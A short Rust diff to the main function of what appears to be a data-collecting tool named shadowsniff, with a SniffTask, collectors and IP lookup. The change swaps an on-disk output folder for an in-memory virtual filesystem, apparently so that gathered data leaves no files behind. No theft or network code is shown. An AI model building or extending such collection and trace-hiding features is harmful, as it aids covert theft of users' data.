@@ -10,6 +10,7 @@ use alloc::format;
 use collector::atomic::AtomicCollector;
 use collector::DisplayCollector;
 use filesystem::storage::StorageFileSystem;
+use filesystem::virtualfs::VirtualFileSystem;
 use filesystem::{FileSystem, FileSystemExt};
 use ipinfo::init_ip_info;
 use shadowsniff::SniffTask;
@@ -30,10 +31,8 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
         panic!()
     }
 
-    let fs = StorageFileSystem;
-    
-    let out = Path::new("output");
-    let _ = fs.remove_dir_all(&out);
+    let fs = VirtualFileSystem::default();
+    let out = Path::new("\\");
     let _ = fs.mkdir(&out);
 
     let collector = AtomicCollector::default();
